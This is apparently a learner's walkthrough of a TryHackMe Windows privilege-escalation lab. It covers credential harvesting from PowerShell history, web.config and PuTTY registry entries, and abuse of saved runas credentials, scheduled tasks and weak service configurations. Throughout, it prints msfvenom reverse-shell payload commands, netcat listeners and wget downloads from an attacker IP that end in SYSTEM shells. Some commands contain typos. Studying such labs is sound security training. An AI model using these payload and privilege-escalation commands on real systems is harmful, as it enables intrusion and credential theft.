Looking at our powershell history. This is actually easier from cmd.exe rather than powershell so I spawned a cmd prompt from powershell. but it is possible from PS. To quote the page:

"Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. "

PS C:\Users\thm-unpriv> cmd.exe
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm-unpriv>
C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
**cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z**
cmdkey /list
cmdkey /delete:thmdc.local
cmdkey /list
runas /?
cmd.exe


cmdkey /list

gives us:

Domain:interactive = WPRIVESC1\mike.katz
Type: Domain Password
User: WPRIVESC1\mike.katz

Now we can run a cmd prompt as mike.katz:
runas /savecred /user:mike.katz cmd.exe 

This spawns another cmd.exe this time running as mike.katz and we can navigate to the C:\Users\mike.katz\Desktop and read the flag with
type flag.txt 

(type works a little like cat on Linux boxes)

I did Q2 out of order, but I don't suppose it matters.
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config>type web.config | findstr connectionString 

gives us the db_admin password:
connectionString="Server=thm-db.local;Database=thm-sekure;User ID=*db_admin*;Password=*098n0x35skjD3*" name="THM-DB"

Don't put credentials in code!

Q4 - This one needs to be done from the original thm-unpriv account:
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

leads us to the PuTTY session for thom.smith and password
CoolPass2021

The next page covers some other 'easy wins'

To exploit scheduled tasks you can list them 
schtasks

adding nc64.exe with your attacker IP and port to the vulntask's schtask.bat file and starting a nc -lvnp PORT on your attacking box will result in a reverse shell:

C:\Windows\system32>whoami                                                                                                                                    │
whoami                                                                                                                                                        │
wprivesc1\taskusr1   

Navigate to Desktop and read the flag:
              │
THM{TASK_COMPLETED} 

Insecure permissions on scheduler (service executable)

Here we find that the user can overwrite a service executable.

use msfvenom on attacking machine (set LHOST and LPORT to attack machine)

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=4445 -f exe-service -o rev-svc.exe

start a server
python3 -m http.Server 8000

and listener

nc -lvnp 4445

On remote machine:

wget:/Attack_IP:4445/rev-svc.exe -O rev-svc.exe

then move the old WService.exe and replace with rev-svc.exe (as shown on the page)

you can stop and start the service without waiting for restart. 

(sc is a shortcut so add .exe)

sc.exe stop windowsschduler
sc.exe start windowsscheduler

and you should get a reverse shell on your attack machine where you can whoami, navigate to that user's Desktop and get the flag!

C:\Users\svcusr1\Desktop>type flag.txt
THM{AT_YOUR_SERVICE}

The next vulnerability exploits how windows treats service names with spaces in. disk searcher enterprise will first try to run disk, then disk searcher, then disk searcher enterprise etc. So if we can sneak an executable in called disk.exe it will be by the service instead of disk searcher etc.

make a payload on attacking machine:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=4446 -f exe-service -o rev-sv2.exe 
nc -lvnp 4446

whisk it over to the remote machine and save in C:\MyPrograms\ as Disk.exe
grant permissions
icacls C:\MyPrograms\Disk.exe /grant Everyone:F

stop and then start the "disk sorter enterprise" service.

Remember to use sc.exe if using Powershell as 'sc' is mapped as a shortcut to Set-Content commandlet

Get flag from user desktop:
type C:\Users\svcusr2\Desktop\flag.txt 

THM{QUOTES_EVERYWHERE}

# Insecure Sys Config
The payloads are all the same, it's just good practice to type out that msfvenom string a lot so here's the next one:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.14.120 LPORT=4447 -f exe-service -o rev-svc3.exe   
start netcat:
nc -lvnp 4447

wget from remote and put in thm-unpriv folder:
wget http://10.11.14.120:8000/rev-svc3.exe -O C:\Users\thm-unpriv\rev-svc3.exe

icacls C:\Users\thm-unpriv\rev-scv3.exe /grant Everyone:F

then configure the vulnerable (editable) THMService to start it.
sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
(sc.exe as I'm in powershell)

 sc.exe stop THMService (it hasn't been started)
  sc.exe start THMService
  and viola...nt authoritaaa!!!

nt authority\system:

get flag!
THM{INSECURE_SVC_CONFIG}